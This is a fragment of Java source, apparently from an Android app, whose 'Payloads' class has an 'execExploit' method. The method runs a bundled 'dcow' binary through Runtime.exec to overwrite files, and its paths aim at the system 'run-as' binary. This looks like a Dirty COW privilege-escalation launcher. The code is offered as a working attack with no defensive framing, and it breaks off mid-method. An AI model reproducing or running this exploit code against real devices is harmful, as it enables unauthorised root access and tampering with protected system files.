...
public class Payloads {
    ...
    public void execExploit(){
        String cwd = "/data/data/com.example.writefile/files/";
        String cwd2 = "/system/bin/";

        String dDir1 = "/data/data/com.example.writefile/files/run-as";
        String dDir2 = "/data/data/com.example.writefile/files/dcow";
        String dDir3 = "/data/data/com.example.writefile/files/exec.sh";
        String exploit = dDir2 + " " + dDir1 + "/system/bin/run-as";
        //
        String[] args = {dDir3};

        try {
            Process p3 = Runtime.getRuntime().exec("ls -l /data/local/tmp/ ", null, new File(cwd2));

            Process p1 = Runtime.getRuntime().exec(dDir2 + " /data/local/tmp/exec.sh  /data/data/com.example.writefile/files/exec.sh", null, new File(cwd));
